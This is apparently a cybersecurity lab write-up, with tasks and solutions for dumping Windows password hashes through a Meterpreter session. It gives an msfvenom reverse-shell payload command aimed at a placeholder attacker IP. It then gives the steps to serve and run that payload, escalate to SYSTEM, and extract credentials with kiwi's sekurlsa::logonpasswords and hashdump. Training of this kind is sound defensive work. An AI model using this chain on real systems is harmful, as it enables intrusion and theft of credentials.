# Use Meterpreter To Dump Password Hashes Stored In The SAM Database And LSASS
In cybersecurity, understanding how attackers extract credentials is key to effective defense. Meterpreter, a post-exploitation tool, enables attackers to access compromised Windows systems and extract sensitive data like password hashes. Through Meterpreter, tools like Mimikatz can dump password hashes from LSASS memory and the SAM database

## References
- [Meterpreter Basics](https://www.offsec.com/metasploit-unleashed/meterpreter-basics/#hashdump)
- [Mimikatz](https://www.offsec.com/metasploit-unleashed/mimikatz/)

## Tasks
- Launch Metasploit and use an appropriate exploit to gain a Meterpreter session on the Windows 7 virtual machine
- Once you have a Meterpreter session, use the "getsystem" command to escalate privileges to SYSTEM level
- Use the "getuid" command to display the current user's privileges
- Use Mimikatz commands within the Meterpreter session to extract usernames and password hashes from the LSASS memory
- Use the "hashdump" command in Meterpreter to dump password hashes from the SAM database


## Solutions
1. Since Kiwi is an integration of Mimikatz into Metasploit by providing functionality directly in a Meterpreter session, it requires a 64-bit Meterpreter session to avoid errors such as `ERROR kuhl_m_sekurlsa_acquireLSA ; mimikatz x86 cannot access x64 process`
2. If the reverse shell in the previous Meterpreter task is 32-bit, recreate a new 64-bit reverse shell using the command:
   ```
   msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<Kali_Linux_IP_address> LPORT=4444 -f exe -o /home/kali/Desktop/reverseshell.exe
   ```
3. Move the reverse shell from the Desktop directory into the web server directory (/var/www/html)
4. Download the reverse shell in the Windows 10 VM and run it as an administrator
5. Once a Meterpreter session is available in Kali Linux, run `getsystem` to escalate privileges
6. Confirm you are running as a SYSTEM user using `getuid`. You should see something like `Server username: NT AUTHORITY\SYSTEM`
7. To load Mimikatz in Meterpreter session, use `load kiwi`
8. Use `kiwi_cmd sekurlsa::logonpasswords` to extract credentials from LSASS memory. This will dump usernames and password hashes
9. To dump password hashes from the SAM database, use `hashdump`

Screenshot of how Kiwi is used in a Meterpreter session:
![image](https://github.com/user-attachments/assets/3fbaa79a-b163-43d5-bc50-7bb025b4c288)

Screenshot of how hashdump is used in a Meterpreter session:
![image](https://github.com/user-attachments/assets/5ded7cc0-7b98-4ad2-8e50-a35ff5841958)

